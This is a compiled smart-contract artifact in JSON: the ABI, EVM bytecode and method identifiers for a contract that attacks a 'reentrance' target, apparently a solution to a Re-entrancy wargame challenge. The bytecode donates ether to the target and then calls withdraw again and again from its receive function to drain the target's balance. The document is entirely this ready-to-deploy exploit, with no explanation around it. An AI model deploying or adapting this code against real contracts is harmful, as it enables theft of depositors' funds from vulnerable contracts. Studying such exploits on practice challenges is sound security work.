{"abi":[{"type":"constructor","inputs":[{"name":"_reentrance","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"reentrance_instance","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"}],"bytecode":{"object":"0x608060405234801561001057600080fd5b506040516105193803806105198339818101604052602081101561003357600080fd5b5051600080546001600160a01b039092166001600160a01b03199092169190911790556104b4806100656000396000f3fe60806040526004361061002d5760003560e01c80639e5faafc1461019a578063e705109e146101b157610195565b36610195576509184e72a00060005b6000546001600160a01b031631821161013f5760005460408051602480820186905282518083039091018152604490910182526020810180516001600160e01b0316632e1a7d4d60e01b178152915181516001600160a01b0390941693919290918291908083835b602083106100c35780518252601f1990920191602091820191016100a4565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114610125576040519150601f19603f3d011682016040523d82523d6000602084013e61012a565b606091505b5050809150508061013a5761013f565b61003c565b80610191576040805162461bcd60e51b815260206004820152601760248201527f46696e616c207265656e7472616e6379206661696c6564000000000000000000604482015290519081900360640190fd5b5050005b600080fd5b3480156101a657600080fd5b506101af6101e2565b005b3480156101bd57600080fd5b506101c661046f565b604080516001600160a01b039092168252519081900360200190f35b60008054604080513060248083019190915282518083039091018152604490910182526020810180516001600160e01b03167e362a9500000000000000000000000000000000000000000000000000000000178152915181516001600160a01b039094169366038d7ea4c680009382918083835b602083106102755780518252601f199092019160209182019101610256565b6001836020036101000a03801982511681845116808217855250505050505090500191505060006040518083038185875af1925050503d80600081146102d7576040519150601f19603f3d011682016040523d82523d6000602084013e6102dc565b606091505b5050905080610332576040805162461bcd60e51b815260206004820152600f60248201527f446f6e6174696f6e206661696c65640000000000000000000000000000000000604482015290519081900360640190fd5b60008054604080516509184e72a000602480830182905283518084039091018152604490920183526020820180516001600160e01b0316632e1a7d4d60e01b178152925182519195946001600160a01b03169390918291908083835b602083106103ad5780518252601f19909201916020918201910161038e565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d806000811461040f576040519150601f19603f3d011682016040523d82523d6000602084013e610414565b606091505b505090508061046a576040805162461bcd60e51b815260206004820152601760248201527f4669727374207769746864726177616c206661696c6564000000000000000000604482015290519081900360640190fd5b505050565b6000546001600160a01b03168156fea264697066735822122088aab8feaae26178edc27be0aa1841895909277cef34235dbb8a7129d5b7619164736f6c634300060c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","reentrance_instance()":"e705109e"},"id":0}